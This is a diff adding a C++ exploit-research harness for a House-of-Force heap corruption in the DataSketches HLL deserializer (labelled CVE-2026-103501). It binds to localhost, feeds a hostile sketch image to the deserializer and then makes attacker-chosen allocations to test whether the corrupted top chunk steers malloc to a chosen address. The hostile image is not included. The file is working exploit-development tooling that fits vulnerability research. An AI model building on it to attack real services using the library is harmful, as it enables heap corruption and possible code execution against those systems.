@@ -1,0 +1,99 @@
+// Lab-only House-of-Force steering probe for CVE-2026-103501.
+// Reads one length-prefixed HLL sketch image from a 127.0.0.1 socket, calls
+// public hll_sketch::deserialize on verbatim pinned 5.2.0, then performs two
+// attacker-sized mallocs and prints the returned pointers. The hostile image
+// patches the live top-chunk size at coupon+40; this front end measures whether
+// that corruption can steer a subsequent allocation to a chosen address.
+// No library source is copied, patched or shimmed.
+#include "hll.hpp"
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#include <cerrno>
+#include <cstdint>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+#include <exception>
+#include <vector>
+using namespace datasketches;
+
+static bool read_exact(int fd, uint8_t* dst, size_t n) {
+  size_t done = 0;
+  while (done < n) {
+    const ssize_t r = ::read(fd, dst + done, n - done);
+    if (r == 0) return false;
+    if (r < 0) { if (errno == EINTR) continue; return false; }
+    done += static_cast<size_t>(r);
+  }
+  return true;
+}
+
+int main(int argc, char** argv) {
+  // argv: port, s1 (hex), s2 (hex)
+  const int port = argc > 1 ? std::atoi(argv[1]) : 38117;
+  const size_t s1 = argc > 2 ? std::strtoul(argv[2], nullptr, 16) : 0x1000;
+  const size_t s2 = argc > 3 ? std::strtoul(argv[3], nullptr, 16) : 0x40;
+
+  const int ls = ::socket(AF_INET, SOCK_STREAM, 0);
+  if (ls < 0) { std::perror("socket"); return 2; }
+  int one = 1;
+  ::setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  sockaddr_in addr;
+  std::memset(&addr, 0, sizeof(addr));
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(static_cast<uint16_t>(port));
+  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // 127.0.0.1 only
+  if (::bind(ls, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) { std::perror("bind"); return 2; }
+  if (::listen(ls, 1) < 0) { std::perror("listen"); return 2; }
+  std::printf("SERVICE_LISTEN port=%d pid=%d\n", port, static_cast<int>(::getpid()));
+  std::fflush(stdout);
+
+  const int cs = ::accept(ls, nullptr, nullptr);
+  if (cs < 0) { std::perror("accept"); return 2; }
+  uint8_t lenbuf[4];
+  if (!read_exact(cs, lenbuf, 4)) { std::printf("SERVICE_IMAGE rv=short_length\n"); return 2; }
+  uint32_t len = 0;
+  std::memcpy(&len, lenbuf, 4);
+  len = ntohl(len);
+  std::printf("SERVICE_IMAGE bytes=%u\n", len);
+  std::fflush(stdout);
+  if (len == 0 || len > (1u << 20)) { std::printf("SERVICE_IMAGE rv=bad_length\n"); return 2; }
+
+  std::vector<uint8_t> buf(len);
+  if (!read_exact(cs, buf.data(), len)) { std::printf("SERVICE_IMAGE rv=short_body\n"); return 2; }
+  try {
+    const auto sk = hll_sketch::deserialize(buf.data(), buf.size());
+    std::printf("SERVICE_DESERIALIZE rv=ok estimate=%f\n", sk.get_estimate());
+  } catch (const std::exception& e) {
+    std::printf("SERVICE_DESERIALIZE rv=exception what=%s\n", e.what());
+  }
+  std::fflush(stdout);
+
+  // sk destroyed at block end; coupon chunk freed to fastbin, top remains corrupted.
+  std::printf("HOOSF_SBRK=%p\n", (void*)::sbrk(0));
+  std::fflush(stdout);
+  void* a1 = std::malloc(s1);
+  std::printf("HOOSF_A1=%p size=0x%zx\n", a1, s1);
+  std::fflush(stdout);
+  if (a1) { const unsigned char* q = (const unsigned char*)a1;
+    std::printf("HOOSF_A1_BYTES=%02x%02x%02x%02x%02x%02x%02x%02x\n",
+      q[0],q[1],q[2],q[3],q[4],q[5],q[6],q[7]); std::fflush(stdout); }
+  if (a1) { std::memset(a1, 0x11, s1 < 16 ? s1 : 16); }
+  void* a2 = std::malloc(s2);
+  std::printf("HOOSF_A2=%p size=0x%zx\n", a2, s2);
+  std::fflush(stdout);
+  if (a2) { const unsigned char* q = (const unsigned char*)a2;
+    std::printf("HOOSF_A2_BYTES=%02x%02x%02x%02x%02x%02x%02x%02x\n",
+      q[0],q[1],q[2],q[3],q[4],q[5],q[6],q[7]); std::fflush(stdout); }
+  if (a2) { std::memset(a2, 0x22, s2 < 16 ? s2 : 16); }
+
+  ::close(cs);
+  ::close(ls);
+  std::printf("SERVICE_EXIT\n");
+  std::fflush(stdout);
+  return 0;
+}
